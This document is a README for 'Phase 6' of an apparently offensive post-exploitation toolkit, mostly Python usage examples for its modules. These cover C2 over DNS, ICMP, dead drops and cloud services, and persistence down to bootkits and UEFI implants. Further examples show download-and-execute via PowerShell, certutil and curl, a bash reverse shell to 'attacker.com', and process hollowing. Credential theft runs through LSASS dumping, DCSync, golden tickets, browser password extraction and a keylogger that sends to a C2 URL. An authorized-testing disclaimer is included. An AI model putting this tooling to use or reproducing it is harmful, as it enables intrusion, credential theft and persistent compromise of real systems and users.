# Phase 6: Advanced Persistence & Command Infrastructure

## Overview

Phase 6 implements sophisticated post-exploitation capabilities including multi-channel command and control infrastructure, advanced persistence mechanisms, Living Off The Land techniques, and comprehensive credential harvesting.

**⚠️ CRITICAL WARNING ⚠️**

This phase contains extremely dangerous capabilities that could cause serious harm:
- **Bootkit/firmware/UEFI modifications** can permanently damage systems
- **Credential harvesting** violates privacy and data protection laws
- **Keylogging and memory scraping** are illegal without explicit authorization
- **Supply chain attacks** can affect countless systems

**ONLY USE IN AUTHORIZED PENETRATION TESTING ENVIRONMENTS**

## Architecture

Phase 6 consists of four major subsystems:

### 1. C2 Infrastructure (`c2_infrastructure/`)

Multi-channel command and control with advanced evasion:

- **C2 Manager**: Orchestrates multiple C2 channels with automatic failover
- **Domain Generation Algorithm (DGA)**: Dynamic domain generation for resilient C2
- **Dead Drop Resolvers**: Asynchronous C2 via Pastebin, GitHub, DNS TXT records
- **P2P Network**: Peer-to-peer mesh networking with DHT and gossip protocol
- **Tunneling**: DNS, ICMP, and HTTPS covert channels
- **Steganography**: Hide C2 traffic in images, audio, PDFs, network timing
- **Cloud C2**: Abuse cloud services (AWS S3, Azure, GCS, Dropbox, OneDrive, Slack)

### 2. Persistence (`persistence/`)

Multi-level persistence from user-mode to hardware:

- **Persistence Manager**: Registry, services, scheduled tasks, WMI, startup folders
- **Bootkit**: MBR/VBR bootkits, kernel rootkits, hypervisor rootkits, SMM rootkits
- **Firmware**: BIOS, UEFI, HDD firmware, network card, GPU, BMC implants
- **UEFI Persistence**: DXE drivers, boot service hooking, LoJax-style attacks
- **Supply Chain**: Dependency confusion, CI/CD compromise, code signing theft

### 3. Living Off The Land (`living_off_land/`)

Leverage legitimate system tools for malicious purposes:

- **LOLBAS Manager**: Orchestrates Living Off The Land techniques
- **Windows LOLBAS**: PowerShell, certutil, regsvr32, rundll32, mshta, WMI, etc.
- **Linux LOLBAS**: curl, wget, bash, cron, systemd, SSH, etc.
- **Fileless Executor**: In-memory execution, reflection loading, process injection

### 4. Credential Harvesting (`credential_harvesting/`)

Comprehensive credential extraction:

- **Credential Manager**: Centralized credential storage with deduplication
- **Mimikatz Automation**: LSASS dumping, Kerberos attacks, DCSync
- **Browser Dumper**: Chrome, Firefox, Edge, Opera, Brave password extraction
- **Kerberos Harvester**: Kerberoasting, AS-REP roasting, ticket manipulation
- **Keylogger**: Cross-platform keystroke capture
- **Memory Scraper**: Extract credentials from process memory

## Installation

### Prerequisites

```bash
# Install Phase 1-5 requirements first
pip install -r requirements.txt
pip install -r requirements-phase2.txt
pip install -r requirements-phase4.txt

# Install Phase 6 requirements
pip install -r requirements-phase6.txt
```

### Platform-Specific Setup

**Windows:**
```powershell
# Install pywin32
pip install pywin32
python Scripts/pywin32_postinstall.py -install

# Install Visual C++ Build Tools (for some packages)
# Download from: https://visualstudio.microsoft.com/downloads/
```

**Linux:**
```bash
# Install system dependencies
sudo apt-get install python3-dev libpam0g-dev libevdev-dev

# For network tools
sudo apt-get install libpcap-dev
```

## Usage

### Quick Start

```python
from core.phase6_engine import Phase6Engine
import asyncio

async def main():
    engine = Phase6Engine()
    
    # Run complete operation
    results = await engine.run_full_operation({
        'stealth_level': 'medium'
    })
    
    print(f"Operation results: {results}")

asyncio.run(main())
```

### C2 Infrastructure

#### Establish Multi-Channel C2

```python
engine = Phase6Engine()

# Setup C2 with multiple channels
await engine.establish_c2(
    channels=['https', 'dns', 'icmp'],
    use_dga=True,
    use_p2p=False,
    use_cloud=True
)
```

#### Domain Generation Algorithm

```python
from c2_infrastructure.domain_generation import HybridDGA

dga = HybridDGA(seed="operation_phoenix", domain_suffix=".com")
domains = dga.generate_domains(count=100)

print(f"DGA domains: {domains[:10]}")
```

#### Dead Drop Communication

```python
from c2_infrastructure.dead_drop_resolver import DeadDropResolver

resolver = DeadDropResolver()
await resolver.setup_dead_drops(['pastebin', 'github', 'dns'])

# Post command
await resolver.post_command("exec whoami")

# Retrieve command
commands = await resolver.retrieve_commands()
```

#### P2P Network

```python
from c2_infrastructure.p2p_network import P2PNetwork

p2p = P2PNetwork(node_id="agent_001")
await p2p.start()

# Add peer
await p2p.add_peer("192.168.1.100", 8080)

# Broadcast command
await p2p.broadcast_command("scan network")
```

#### Covert Channels

```python
from c2_infrastructure.tunneling import DNSTunnel, ICMPTunnel

# DNS tunneling
dns = DNSTunnel(domain="c2.example.com")
await dns.send_data(b"exfiltrated data")

# ICMP tunneling
icmp = ICMPTunnel()
await icmp.send_data(b"covert message")
```

#### Steganography

```python
from c2_infrastructure.steganography import SteganographyChannel
from PIL import Image

stego = SteganographyChannel()

# Hide data in image
cover_image = Image.open("photo.jpg")
stego_image = await stego.encode_lsb(cover_image, b"secret payload")
stego_image.save("innocent_photo.jpg")

# Extract data
extracted = await stego.decode_lsb(stego_image)
```

#### Cloud C2

```python
from c2_infrastructure.cloud_c2 import CloudC2Infrastructure

cloud = CloudC2Infrastructure()
await cloud.setup_providers(['aws', 'azure', 'dropbox'])

# Upload command
await cloud.upload_command("aws", "execute payload")

# Download results
results = await cloud.download_results("aws")
```

### Persistence

#### Basic Persistence

```python
engine = Phase6Engine()

# Deploy user-mode persistence
results = await engine.deploy_persistence(
    mechanisms=['registry', 'scheduled_task', 'service'],
    stealth_level='medium'
)
```

#### Advanced Persistence

```python
# Deploy bootkit (EXTREME RISK)
results = await engine.deploy_persistence(
    mechanisms=['bootkit'],
    stealth_level='high'
)

# Deploy UEFI persistence (EXTREME RISK)
results = await engine.deploy_persistence(
    mechanisms=['uefi', 'hypervisor'],
    stealth_level='extreme'
)
```

#### Persistence Manager

```python
from persistence.persistence_manager import PersistenceManager
from pathlib import Path

manager = PersistenceManager()

# Install all mechanisms
await manager.install_all()

# Verify persistence
status = await manager.verify_all()

# Reinstall failed
await manager.reinstall_failed()

# Remove all
await manager.remove_all()
```

### Living Off The Land

#### Windows LOLBAS

```python
from living_off_land.windows_lol import WindowsLOL

windows = WindowsLOL()

# PowerShell download & execute
await windows.powershell_download_execute(
    "http://c2.com/payload.ps1"
)

# Certutil download
await windows.certutil_download(
    "http://c2.com/tool.exe",
    "tool.exe"
)

# WMI execution
await windows.wmi_execute_process("notepad.exe")

# BITS download
await windows.bitsadmin_download(
    "http://c2.com/file.zip",
    "file.zip"
)
```

#### Linux LOLBAS

```python
from living_off_land.linux_lol import LinuxLOL

linux = LinuxLOL()

# Curl download & execute
await linux.curl_download_execute("http://c2.com/payload.sh")

# Bash reverse shell
await linux.bash_reverse_shell("attacker.com", 4444)

# Cron persistence
await linux.cron_persistence("* * * * * /tmp/backdoor.sh")

# Systemd service
await linux.systemd_service_persistence(
    "/tmp/backdoor.sh",
    "innocent-service"
)
```

#### Fileless Execution

```python
from living_off_land.fileless_executor import FilelessExecutor

executor = FilelessExecutor()

# PowerShell reflection loading
assembly = b"<.NET assembly bytes>"
await executor.powershell_reflection_load(assembly)

# Shellcode injection
shellcode = b"\x90\x90..."
await executor.powershell_shellcode_injection(shellcode, target_pid=1234)

# Process hollowing
await executor.process_hollowing(
    target_process="svchost.exe",
    payload=b"<payload>"
)
```

### Credential Harvesting

#### Harvest All Credentials

```python
engine = Phase6Engine()

results = await engine.harvest_credentials(export_format='json')
print(f"Harvested {results['total']} credentials")
print(f"Exported to: {results['export_path']}")
```

#### Mimikatz Automation

```python
from credential_harvesting.mimikatz_automation import MimikatzAutomation

mimikatz = MimikatzAutomation()

# Dump LSASS
creds = await mimikatz.dump_lsass_memory()

# Extract Kerberos tickets
tickets = await mimikatz.extract_kerberos_tickets()

# DCSync attack
await mimikatz.dcsync_attack("DOMAIN", "Administrator")

# Golden ticket
await mimikatz.golden_ticket_attack(
    domain="CORP",
    sid="S-1-5-21-...",
    krbtgt_hash="abc123..."
)
```

#### Browser Password Dumper

```python
from credential_harvesting.browser_dumper import BrowserPasswordDumper

dumper = BrowserPasswordDumper()

# Extract Chrome passwords
chrome_creds = await dumper.extract_chrome()

# Extract Firefox passwords
firefox_creds = await dumper.extract_firefox()

# Extract cookies
cookies = await dumper.extract_cookies('chrome')
```

#### Kerberos Harvester

```python
from credential_harvesting.kerberos_harvester import KerberosHarvester

kerberos = KerberosHarvester()

# Kerberoasting
tgs_hashes = await kerberos.kerberoasting()

# AS-REP roasting
asrep_hashes = await kerberos.asrep_roasting()

# Pass-the-ticket
from pathlib import Path
await kerberos.pass_the_ticket(Path("admin.kirbi"))
```

#### Keylogger

```python
from credential_harvesting.keylogger import Keylogger
from pathlib import Path

keylogger = Keylogger(
    output_file=Path("keylog.txt"),
    remote_endpoint="https://c2.com/keylog"
)

# Start keylogging
await keylogger.start()

# Stop after some time
await asyncio.sleep(3600)
await keylogger.stop()
```

#### Memory Scraper

```python
from credential_harvesting.memory_scraper import MemoryScraper

scraper = MemoryScraper()

# Scan all processes
creds = await scraper.harvest()

# Scan environment variables
env_creds = await scraper.scan_environment_variables()

# Scan command history
history_creds = await scraper.scan_command_history()

# Scan config files
config_creds = await scraper.scan_config_files()
```

## Integration with Previous Phases

```python
from core.phase6_engine import Phase6Engine
from evasion.evasion_engine import EvasionEngine

async def full_attack_chain():
    # Phase 4: Evasion
    evasion = EvasionEngine()
    await evasion.evade_all_defenses()
    
    # Phase 6: Post-Exploitation
    phase6 = Phase6Engine()
    
    # Establish C2
    await phase6.establish_c2(channels=['https', 'dns'])
    
    # Deploy persistence
    await phase6.deploy_persistence(stealth_level='high')
    
    # Harvest credentials
    creds = await phase6.harvest_credentials()
    
    # Use credentials for lateral movement
    # ...
```

## Security Considerations

### Legal Requirements

1. **Written Authorization**: Always obtain written permission before testing
2. **Scope Definition**: Clearly define what systems can be tested
3. **Data Handling**: Have agreement on handling sensitive data found
4. **Reporting**: Document everything for client's security improvements

### Operational Security

1. **Test Environment**: Use isolated test environments when possible
2. **Data Minimization**: Only collect necessary data
3. **Secure Storage**: Encrypt all harvested credentials immediately
4. **Clean Removal**: Remove all persistence mechanisms after testing
5. **Incident Response**: Have plan for if things go wrong

### Ethical Guidelines

1. **No Public Exploitation**: Never deploy against public systems
2. **Responsible Disclosure**: Report vulnerabilities properly
3. **Data Protection**: Respect privacy of individuals
4. **Professional Conduct**: Follow industry best practices

## Troubleshooting

### C2 Connection Issues

```python
# Enable debug logging
import logging
logging.basicConfig(level=logging.DEBUG)

# Test individual channels
from c2_infrastructure.tunneling import HTTPSTunnel
https = HTTPSTunnel("https://c2.example.com")
await https.send_command("test")
```

### Persistence Verification

```python
from persistence.persistence_manager import PersistenceManager

manager = PersistenceManager()
status = await manager.verify_all()

for mechanism, active in status.items():
    print(f"{mechanism}: {'Active' if active else 'Failed'}")
```

### Credential Harvesting Errors

```python
# Test individual harvesters
from credential_harvesting.mimikatz_automation import MimikatzAutomation

mimikatz = MimikatzAutomation()
try:
    creds = await mimikatz.dump_lsass_memory()
except Exception as e:
    print(f"LSASS dump failed: {e}")
    # Try alternative method
    creds = await mimikatz.dump_sam()
```

## Performance Optimization

### Parallel Harvesting

```python
# Harvest credentials in parallel
import asyncio

tasks = [
    mimikatz.dump_lsass_memory(),
    browser_dumper.extract_chrome(),
    kerberos.kerberoasting(),
]

results = await asyncio.gather(*tasks)
```

### Memory Management

```python
# Clean up large credential sets
manager = CredentialManager()
await manager.harvest_all()

# Export and clear
await manager.export_credentials(Path("creds.json"))
manager.credentials.clear()
```

## Advanced Topics

### Custom C2 Channels

```python
from c2_infrastructure.c2_manager import C2Channel

class CustomC2(C2Channel):
    def __init__(self):
        super().__init__("custom")
        
    async def send_command(self, command: str) -> bool:
        # Implement custom protocol
        pass
        
    async def receive_response(self) -> str:
        # Implement response handling
        pass

# Register custom channel
manager = C2Manager()
await manager.add_channel(CustomC2())
```

### Custom Persistence

```python
from persistence.persistence_manager import PersistenceMechanism

class CustomPersistence(PersistenceMechanism):
    def __init__(self):
        super().__init__("custom", "Custom persistence")
        
    async def install(self) -> bool:
        # Implement installation
        pass
        
    async def verify(self) -> bool:
        # Implement verification
        pass
```

## References

- **MITRE ATT&CK**: https://attack.mitre.org/
- **LOLBAS Project**: https://lolbas-project.github.io/
- **GTFOBins**: https://gtfobins.github.io/
- **Kerberos Attacks**: https://www.tarlogic.com/blog/how-to-attack-kerberos/
- **Bootkit Guide**: https://github.com/theopolis/uefi-firmware-parser

## License

This software is provided for educational and authorized security testing purposes only.
